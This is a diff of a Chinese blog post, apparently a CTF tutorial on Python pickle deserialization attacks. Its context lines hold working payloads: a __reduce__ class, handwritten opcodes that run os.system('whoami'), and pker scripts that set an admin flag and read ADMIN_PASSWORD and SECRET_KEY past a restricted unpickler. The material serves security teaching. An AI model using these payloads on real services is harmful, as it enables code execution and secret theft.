@@ -107,13 +107,13 @@
 <p>简单的序列化与反序列化可以使用 pickle 模块直接提供的函数</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">pickle.dump(obj, file, protocol=None, *, fix_imports=True, buffer_callback=None)
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">pickle.dump(obj, file, protocol=None, *, fix_imports=True, buffer_callback=None)
 pickle.dumps(obj, protocol=None, *, fix_imports=True, buffer_callback=None)
 pickle.load(file, *, fix_imports=True, encoding="ASCII", errors="strict", buffers=None)
 pickle.loads(data, /, *, fix_imports=True, encoding="ASCII", errors="strict", buffers=None)
@@ -123,11 +123,11 @@ pickle.loads(data, /, *, fix_imports=True, encoding="ASCII", errors="strict", bu
 <p>若要对序列化或反序列化操作进行进一步的自定义，则可以通过继承 pickle 模块提供的序列化与反序列化类并实现一些特殊方法进行处理</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">class pickle.Pickler(file, protocol=None, *, fix_imports=True, buffer_callback=None)
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">class pickle.Pickler(file, protocol=None, *, fix_imports=True, buffer_callback=None)
 class pickle.Unpickler(file, *, fix_imports=True, encoding="ASCII", errors="strict", buffers=None)
 </code></pre></td></tr></table>
 </div>
@@ -136,7 +136,7 @@ class pickle.Unpickler(file, *, fix_imports=True, encoding="ASCII", errors="stri
 <p>比如 2021 年国赛西南分区赛的这道 Web 题，便是采用了这种方法进行过滤，之后也会以这道题为例介绍反序列化的利用方法</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -145,7 +145,7 @@ class pickle.Unpickler(file, *, fix_imports=True, encoding="ASCII", errors="stri
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">class</span> <span class="nc">RestrictedUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">Unpickler</span><span class="p">):</span>
+<pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="k">class</span> <span class="nc">RestrictedUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">Unpickler</span><span class="p">):</span>
     <span class="k">def</span> <span class="nf">find_class</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
         <span class="c1"># Only allow safe classes</span>
         <span class="k">if</span> <span class="n">module</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">'settings'</span><span class="p">]</span> <span class="ow">and</span> <span class="s2">"__"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
@@ -161,7 +161,7 @@ class pickle.Unpickler(file, *, fix_imports=True, encoding="ASCII", errors="stri
 <p>pickle 源码中列出了各种 opcode 及其进行的操作</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -252,7 +252,7 @@ class pickle.Unpickler(file, *, fix_imports=True, encoding="ASCII", errors="stri
 </span><span class="lnt">89
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span>
+<pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="c1"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span>
 <span class="c1"># here is in kind-of alphabetical order of 1-character pickle code.</span>
 <span class="c1"># pickletools groups them by purpose.</span>
 
@@ -452,7 +452,7 @@ class pickle.Unpickler(file, *, fix_imports=True, encoding="ASCII", errors="stri
 <p>执行恶意命令是 pickle 反序列化最简单也是最危险的利用方法，可以直接通过 <code>__reduce__</code> 方法进行利用</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -462,7 +462,7 @@ class pickle.Unpickler(file, *, fix_imports=True, encoding="ASCII", errors="stri
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">os</span>
+<pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">os</span>
 <span class="kn">import</span> <span class="nn">pickle</span>
 
 <span class="k">class</span> <span class="nc">Evil</span><span class="p">():</span>
@@ -476,7 +476,7 @@ class pickle.Unpickler(file, *, fix_imports=True, encoding="ASCII", errors="stri
 <p>我就以反序列化执行环境未导入 <code>os</code> 模块举例，在这种情况下执行 <code>os.system('whoami')</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -486,7 +486,7 @@ class pickle.Unpickler(file, *, fix_imports=True, encoding="ASCII", errors="stri
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">c__builtin__
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">c__builtin__
 getattr
 (c__builtin__
 __import__
@@ -504,13 +504,13 @@ tR.
 <p>若使用 pker 库生成，则对应代码为</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">os</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'__builtin__'</span><span class="p">,</span> <span class="s1">'__import__'</span><span class="p">)(</span><span class="s1">'os'</span><span class="p">)</span>
+<pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="n">os</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'__builtin__'</span><span class="p">,</span> <span class="s1">'__import__'</span><span class="p">)(</span><span class="s1">'os'</span><span class="p">)</span>
 <span class="n">system</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'__builtin__'</span><span class="p">,</span> <span class="s1">'getattr'</span><span class="p">)(</span><span class="n">os</span><span class="p">,</span> <span class="s1">'system'</span><span class="p">)</span>
 <span class="n">system</span><span class="p">(</span><span class="s1">'whoami'</span><span class="p">)</span>
 <span class="k">return</span>
@@ -524,14 +524,14 @@ tR.
 <p>这里讨论 <code>dict</code> <code>list</code> 等没有 <code>__dict__</code> 属性的对象的情况，可以通过获取其 <code>update</code> <code>append</code> 等函数进行修改，比如下面的示例代码</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">secret</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'ADMIN'</span><span class="p">:</span> <span class="mi">0</span><span class="p">}</span>
+<pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="n">secret</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'ADMIN'</span><span class="p">:</span> <span class="mi">0</span><span class="p">}</span>
 
 <span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
     <span class="k">if</span> <span class="n">secret</span><span class="o">.</span><span class="n">ADMIN</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
@@ -542,7 +542,7 @@ tR.
 <p>构造 opcode 如下，最终调用函数为 <code>__main__.secret.update({'ADMIN': 1})</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -552,7 +552,7 @@ tR.
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">c__builtin__
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">c__builtin__
 getattr
 (c__main__
 secret
@@ -570,13 +570,13 @@ dtR.
 <p>若使用 pker 库生成，则对应代码为</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">secret</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'__main__'</span><span class="p">,</span> <span class="s1">'secret'</span><span class="p">)</span>
+<pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="n">secret</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'__main__'</span><span class="p">,</span> <span class="s1">'secret'</span><span class="p">)</span>
 <span class="n">update</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'__builtin__'</span><span class="p">,</span> <span class="s1">'getattr'</span><span class="p">)(</span><span class="n">secret</span><span class="p">,</span> <span class="s1">'update'</span><span class="p">)</span>
 <span class="n">update</span><span class="p">({</span><span class="s1">'ADMIN'</span><span class="p">:</span> <span class="mi">1</span><span class="p">})</span>
 <span class="k">return</span>
@@ -586,7 +586,7 @@ dtR.
 <p>通过 <code>c</code> 操作码还可以获取到其它模块中的隐私数据，比如 2021 年国赛西南分区赛 Web3</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -602,7 +602,7 @@ dtR.
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">settings</span> <span class="kn">import</span> <span class="n">SECRET_KEY</span><span class="p">,</span> <span class="n">User</span><span class="p">,</span> <span class="n">ADMIN_PASSWORD</span>
+<pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">settings</span> <span class="kn">import</span> <span class="n">SECRET_KEY</span><span class="p">,</span> <span class="n">User</span><span class="p">,</span> <span class="n">ADMIN_PASSWORD</span>
 
 <span class="err">……</span>
 
@@ -625,14 +625,14 @@ dtR.
 <p>这里就简单写一下应该可以用的 pker 对应代码</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">User</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'__main__'</span><span class="p">,</span> <span class="s1">'User'</span><span class="p">)</span>
+<pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="n">User</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'__main__'</span><span class="p">,</span> <span class="s1">'User'</span><span class="p">)</span>
 <span class="n">Haha</span> <span class="o">=</span> <span class="n">OBJ</span><span class="p">(</span><span class="n">User</span><span class="p">)</span>
 <span class="n">Haha</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'settings'</span><span class="p">,</span> <span class="s1">'ADMIN_PASSWORD'</span><span class="p">)</span>
 <span class="n">Haha</span><span class="o">.</span><span class="n">msg</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'settings'</span><span class="p">,</span> <span class="s1">'SECRET_KEY'</span><span class="p">)</span>
@@ -671,7 +671,7 @@ dtR.
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
 </main><footer class="footer">
-<div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" rel="noopener noreffer" target="_blank" title="Hugo 0.85.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" rel="noopener noreffer" target="_blank" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+<div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" rel="noopener noreffer" target="_blank" title="Hugo 0.87.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" rel="noopener noreffer" target="_blank" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
 </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder"> <a href="/" target="_blank">X5tar</a></span> | <span class="license"><a href="https://creativecommons.org/licenses/by-sa/4.0/" rel="license external nofollow noopener noreffer" target="_blank">CC BY-SA 4.0</a></span></div>
 </div>
 </footer></div>
